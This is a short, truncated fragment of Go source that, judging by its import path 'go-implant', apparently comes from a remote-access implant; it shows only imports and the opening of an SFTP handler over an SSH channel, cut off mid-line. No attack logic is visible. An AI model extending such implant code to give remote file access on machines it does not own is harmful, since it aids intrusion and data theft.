package ssh

import (
	"go-implant/client/config"
	"io"
	"log"

	"github.com/pkg/sftp"
	"golang.org/x/crypto/ssh"
)

func handlesftp(channel ssh.Channel) {

	serverOptions := []sftp.ServerOption{}

	server, er